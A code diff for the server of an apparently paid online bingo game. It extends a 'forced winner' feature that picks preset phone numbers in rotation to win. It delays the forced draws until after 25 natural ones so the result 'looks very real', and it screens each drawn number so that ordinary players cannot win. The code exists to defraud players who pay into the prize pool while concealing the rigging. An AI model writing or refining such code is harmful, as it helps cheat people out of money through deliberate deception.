@@ -1146,7 +1146,7 @@ let globalTakenTickets = [];
 
 // 🔥 Mid-game locking mechanism for Forced Winners 🔥
 let midGameChosenRigged = null;
-let recentRiggedWinners = []; // 🌟 አሸናፊዎች እንዳይደጋገሙ የሚያስታውስ ማህደረ-ትውስታ 🌟
+let recentRiggedWinners = []; 
 
 function serverCheckBingo(grid, called) {
     let m = Array(5).fill().map(() => Array(5).fill(false));
@@ -1184,7 +1184,6 @@ async function declareWinners(winners) {
     let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones ? GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim()).filter(p => p) : [];
 
     for (let w of winners) {
-        // 🔥 ስሙ ወይም ስልኩ ቢቀየርም አዲሱን ስም/ስልክ ተጠቅሞ ለተጠቃሚው እንዲከፍል እና አሸናፊው ላይ እንዲያወጣ
         const user = await User.findOne({phone: w.player.phone});
         let latestName = w.player.name; 
         let latestPhone = w.player.phone;
@@ -1198,10 +1197,8 @@ async function declareWinners(winners) {
             io.emit('balance_updated', latestPhone); 
         }
 
-        // 🔥 አሸናፊዎች እንዳይደጋገሙ (ወደ ሚቀጥለው ማዞር)
         if (riggedPhones.includes(latestPhone)) {
             recentRiggedWinners.push(latestPhone);
-            // ዳታው እንዳይበዛ 20 የቅርብ ጊዜ አሸናፊዎችን ብቻ መያዝ
             if (recentRiggedWinners.length > 20) recentRiggedWinners.shift();
         }
         
@@ -1252,7 +1249,7 @@ function resetToWaiting() {
     totalPrizePool = 0; totalCollectedMoney = 0; totalTickets = 0; 
     calledNumbers = []; currentDrawSequence = [];
     gameId = Math.floor(Math.random() * 9000) + 1000; globalTakenTickets = []; io.emit('update_taken_tickets', globalTakenTickets); 
-    midGameChosenRigged = null; // Reset mid-game rig lock
+    midGameChosenRigged = null; 
 }
 
 setInterval(() => {
@@ -1277,35 +1274,41 @@ setInterval(() => {
             gameClock = 3; 
             if (currentDrawSequence.length === 0) { resetToWaiting(); return; } 
             
-            // 🌟 MID-GAME DYNAMIC RIGGING LOGIC (አሸናፊዎች እንዳይደጋገሙ ማዞሪያ) 🌟
+            // 🌟 MID-GAME DYNAMIC RIGGING LOGIC (Natural Delay & Anti-Repeat) 🌟
             let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones ? GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim()).filter(p => p) : [];
+            let isRiggedGame = false;
+
             if (riggedPhones.length > 0) {
                 let activeRigged = riggedPhones.filter(p => activePlayers[p]);
                 if (activeRigged.length > 0) {
-                    
+                    isRiggedGame = true;
                     if (!midGameChosenRigged || !activeRigged.includes(midGameChosenRigged)) {
-                        // በቅርብ ጊዜ ያላሸነፉትን ስልኮች ብቻ መምረጥ
                         let availableRigged = activeRigged.filter(p => !recentRiggedWinners.includes(p));
-                        
                         if (availableRigged.length === 0) {
-                            // ሁሉም ስልኮች አሸንፈው ካለቁ፣ እገዳውን ማንሳትና እንደ አዲስ ማዞር
                             recentRiggedWinners = recentRiggedWinners.filter(p => !activeRigged.includes(p));
                             availableRigged = activeRigged;
                         }
-                        
-                        // ያላሸነፉት ውስጥ በዕጣ አንዱን መምረጥ
                         midGameChosenRigged = availableRigged[Math.floor(Math.random() * availableRigged.length)];
                     }
-                    
+                } else {
+                    midGameChosenRigged = null;
+                }
+            } else {
+                midGameChosenRigged = null;
+            }
+
+            let num;
+
+            if (isRiggedGame && midGameChosenRigged) {
+                // 1. Force the numbers ONLY after 25 natural draws (Makes it look very real)
+                if (calledNumbers.length >= 25) {
                     let targetTicket = activePlayers[midGameChosenRigged].ticketsData[0]; 
-                    
                     let neededNumbers = [
                         targetTicket.grid[0][2],
                         targetTicket.grid[1][2],
                         targetTicket.grid[3][2],
                         targetTicket.grid[4][2]
                     ];
-                    
                     let remainingNeeded = neededNumbers.filter(n => !calledNumbers.includes(n));
                     
                     if (remainingNeeded.length > 0) {
@@ -1316,15 +1319,48 @@ setInterval(() => {
                             currentDrawSequence.unshift(forceBall);
                         }
                     }
-                } else {
-                    midGameChosenRigged = null;
                 }
-            } else {
-                midGameChosenRigged = null;
-            }
-            // 🌟 END MID-GAME RIGGING 🌟
 
-            let num = currentDrawSequence.shift(); 
+                // 2. Draw a number, BUT PREVENT normal players from winning
+                let validIndex = -1;
+                for (let i = 0; i < currentDrawSequence.length; i++) {
+                    let testNum = currentDrawSequence[i];
+                    let tempCalled = [...calledNumbers, testNum];
+                    
+                    let nonRiggedWins = false;
+                    let riggedWins = false;
+
+                    for (let player of Object.values(activePlayers)) {
+                        for (let ticket of player.ticketsData) { 
+                            if (serverCheckBingo(ticket.grid, tempCalled)) { 
+                                if (player.phone === midGameChosenRigged) {
+                                    riggedWins = true;
+                                } else {
+                                    nonRiggedWins = true;
+                                }
+                            } 
+                        }
+                    }
+
+                    // Pick this number if it makes the rigged player win OR if it makes nobody win
+                    if (riggedWins || !nonRiggedWins) {
+                        validIndex = i;
+                        break;
+                    }
+                }
+
+                if (validIndex !== -1) {
+                    num = currentDrawSequence.splice(validIndex, 1)[0];
+                } else {
+                    // Rare fallback
+                    num = currentDrawSequence.shift();
+                }
+
+            } else {
+                // Normal Random Game
+                num = currentDrawSequence.shift(); 
+            }
+
             calledNumbers.push(num); 
             io.emit('new_number', num);
             
